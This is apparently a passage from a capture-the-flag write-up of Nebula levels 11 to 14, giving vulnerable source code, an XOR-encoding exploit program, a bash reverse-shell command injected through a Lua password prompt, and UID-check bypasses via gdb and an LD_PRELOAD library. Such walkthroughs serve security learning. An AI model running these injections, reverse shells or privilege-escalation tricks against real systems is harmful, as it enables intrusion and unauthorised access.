</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;reading from stdin&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">CL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;invalid header&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">length</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">CL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread length&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">blue</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">pink</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">while</span><span class="p">(</span><span class="n">blue</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;blue = %d, length = %d, &quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="n">pink</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;pink = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">pink</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;fread fail(blue = %d, length = %d)&quot;</span><span class="p">,</span> <span class="n">blue</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">pink</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>          <span class="n">blue</span> <span class="o">-=</span> <span class="n">pink</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;mmap&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">process</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>fread(buf, length, 1, stdin)</code> always returns 1 as we can read in the unix manual:
<code>fread()  and  fwrite()  return the number of items successfully read or written (i.e., not the number of characters).</code></p>

<p>Here <code>if(length &lt; sizeof(buf)) {</code> we have two ways to progress. I suppose
having two solutions means calling <code>process()</code> from the different parts of code.</p>

<p>The first way is setting &ldquo;Content-Length: 1&rdquo;. The buffer is XORed using the simple algorithm below, this time the &lsquo;for&rsquo; cycle runs only once.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ruby -e 'print "Content-Length: 1\nA"' | /home/flag11/flag11 
</span><span class='line'>sh: @: command not found
</span><span class='line'>
</span><span class='line'>sh-4.2$ ruby -e 'print "Content-Length: 1\n" + ("A".ord ^ 0x01).chr'  | /home/flag11/flag11 
</span><span class='line'>sh: $'A\300Q': command not found
</span><span class='line'>
</span><span class='line'>sh-4.2$ ruby -e 'print "Content-Length: 1\n" + ("A".ord ^ 0x01).chr'  | /home/flag11/flag11 
</span><span class='line'>sh: -c: line 0: unexpected EOF while looking for matching ``'
</span><span class='line'>sh: -c: line 1: syntax error: unexpected end of file
</span><span class='line'>
</span><span class='line'>sh-4.2$ ruby -e 'print "Content-Length: 1\n" + ("A".ord ^ 0x01).chr'  | /home/flag11/flag11 
</span><span class='line'>sh: A: command not found</span></code></pre></td></tr></table></div></figure>


<p>Because the buffer with &lsquo;A&rsquo; character is not NULL terminated and contains
uninitialized data, we use the technique described here <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Controlling uninitialized memory with LD_PRELOAD</a>
to have more luck with terminating &lsquo;A&rsquo;.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ln -sf /bin/getflag /tmp/A
</span><span class='line'>sh-4.2$ export PATH=/tmp:$PATH
</span><span class='line'>
</span><span class='line'>sh-4.2$ export LD_PRELOAD=$(ruby -e 'print "\n" * 50')
</span><span class='line'>
</span><span class='line'>sh-4.2$ ruby -e 'print "Content-Length: 1\n" + ("A".ord ^ 0x01).chr'  | /home/flag11/flag11 
</span><span class='line'>getflag is executing on a non-flag account, this doesn't count</span></code></pre></td></tr></table></div></figure>


<p>The getflag runs, albeit there is a bug in the binary, because the new process
is created using <code>system()</code>, so it wasn&rsquo;t possible to get flag11 privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 3 system
</span><span class='line'>
</span><span class='line'>  Do not use system() from a program with set-user-ID or set-group-ID privileges,
</span><span class='line'>  because strange values for some environment variables might be used to subvert
</span><span class='line'>  system integrity. Use the exec(3) family of functions instead, but not
</span><span class='line'>  execlp(3) or execvp(3). system() will not, in fact, work properly from
</span><span class='line'>  programs with set-user-ID or set-group-ID privileges on systems on which
</span><span class='line'>  /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian
</span><span class='line'>  uses a modified bash which does not do this when invoked as sh.)</span></code></pre></td></tr></table></div></figure>


<p>The second way is to use input with the length at least 1024. The decryption
routine is almost symmetric. However, in this step <code>key -= buffer[i];</code> we need
to substract from key the original value, so we XOR it with the key again.</p>

<figure class='code'><figcaption><span>exploit11.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;/bin/getflag&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span>  <span class="n">cmd_length</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">cmd_length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">cmd_length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>        <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&quot;Content-Length: 1024</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ export TEMP=/tmp
</span><span class='line'>sh-4.2$ ./exploit11 | /home/flag11/flag11 
</span><span class='line'>blue = 1024, length = 1024, pink = 1024
</span><span class='line'>getflag is executing on a non-flag account, this doesn't count</span></code></pre></td></tr></table></div></figure>


<h2>Level12</h2>

<p>The code below should be backdoored:</p>

<figure class='code'><figcaption><span>level12.lua</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">socket</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">socket&quot;</span><span class="p">)</span>
</span><span class='line'><span class="kd">local</span> <span class="n">server</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">50001</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'>  <span class="n">prog</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">echo &quot;</span><span class="o">..</span><span class="n">password</span><span class="o">..</span><span class="s2">&quot;</span><span class="s"> | sha1sum&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">r&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">prog</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">*all&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">prog</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">:</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Password: &quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">line</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">client</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">err</span> <span class="k">then</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">trying &quot;</span> <span class="o">..</span> <span class="n">line</span><span class="p">)</span> <span class="c1">-- log from where ;\</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">h</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">h</span> <span class="o">~=</span> <span class="s2">&quot;</span><span class="s">4754a4f4bd5787accd33de887b9250a0691dd198&quot;</span> <span class="k">then</span>
</span><span class='line'>          <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Better luck next time</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>          <span class="n">client</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Congrats, your token is 413**CARRIER LOST**</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">client</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>With <code>io.popen</code> we can invoke arbitrary command using several techniques. We
use command substitution and two screens to gain reverse shell using bash:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Window1:
</span><span class='line'>sh-4.2$ nc -l 1337
</span><span class='line'>
</span><span class='line'>Window2:
</span><span class='line'>sh-4.2$ nc 0 50001
</span><span class='line'>Password: $(bash -i >& /dev/tcp/0.0.0.0/1337 0>&1)
</span><span class='line'>
</span><span class='line'>Window1:
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>flag12@nebula:/$ id
</span><span class='line'>id
</span><span class='line'>uid=987(flag12) gid=987(flag12) groups=987(flag12)
</span><span class='line'>
</span><span class='line'>flag12@nebula:/$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level13</h2>

<p>The vulnerable program checks if the user does match the specific user id.</p>

<figure class='code'><figcaption><span>leve13_safe.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define FAKEUID 1000</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Security failure detected. UID %d started us, we expect %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The system administrators will be notified of this violation</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// snip, sorry :)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your token is %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/home/flag13$ objdump -M intel flag13 -d | grep 0x3e8
</span><span class='line'> 80484f4:       3d e8 03 00 00          cmp    eax,0x3e8
</span><span class='line'> 8048505:       c7 44 24 08 e8 03 00    mov    DWORD PTR [esp+0x8],0x3e8</span></code></pre></td></tr></table></div></figure>


<p>Because we know where the value 0x3e8 = 1000 is used to compare with eax, now
we need only to tamper this value:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/home/flag13$ gdb ./flag13 -q
</span><span class='line'>Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
</span><span class='line'>
</span><span class='line'>(gdb) set disassembly-flavor intel
</span><span class='line'>
</span><span class='line'>(gdb) b *0x80484f4
</span><span class='line'>Breakpoint 1 at 0x80484f4
</span><span class='line'>
</span><span class='line'>(gdb) r
</span><span class='line'>Starting program: /home/flag13/flag13 
</span><span class='line'>Breakpoint 1, 0x080484f4 in main ()
</span><span class='line'>
</span><span class='line'>(gdb) i r eax 
</span><span class='line'>eax            0x3f6    1014
</span><span class='line'>
</span><span class='line'>(gdb) set $eax = 1000
</span><span class='line'>
</span><span class='line'>(gdb) i r eax 
</span><span class='line'>eax            0x3e8    1000
</span><span class='line'>
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58
</span><span class='line'>
</span><span class='line'>level13@nebula:/home/flag13$ su flag13
</span><span class='line'>Password: 
</span><span class='line'>sh-4.2$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<p>As another solution we use the PRELOAD library. We use the copy of flag13,
because the restriction with invoking preload with suid binaries.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/tmp$ cat fakeuid.c 
</span><span class='line'>#include &lt;sys/types.h>
</span><span class='line'>uid_t getuid(void) { return 1000; }
</span><span class='line'>
</span><span class='line'>level13@nebula:/tmp$ gcc -shared -fPIC fakeuid.c -o fakeuid.so
</span><span class='line'>
</span><span class='line'>level13@nebula:/tmp$ cp /home/flag13/flag13 .
</span><span class='line'>
</span><span class='line'>level13@nebula:/tmp$ LD_PRELOAD=./fakeuid.so ./flag13 
</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span></code></pre></td></tr></table></div></figure>


<h2>Level14</h2>

<p>The encryption process is trivial, on each byte position, the
/home/flag14/flag14 add the position index to the ascii value of the character,
started by 0, see:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level14@nebula:/home/flag14$ ruby -e 'print "\x01\x02\x03\x04"' | ./flag14 -e | hexdump -C
</span><span class='line'>00000000  01 03 05 07                                       |....|
</span><span class='line'>00000004
</span><span class='line'>level14@nebula:/home/flag14$ ruby -e 'print "\xff\xff\xff\xff"' | ./flag14 -e | hexdump -C
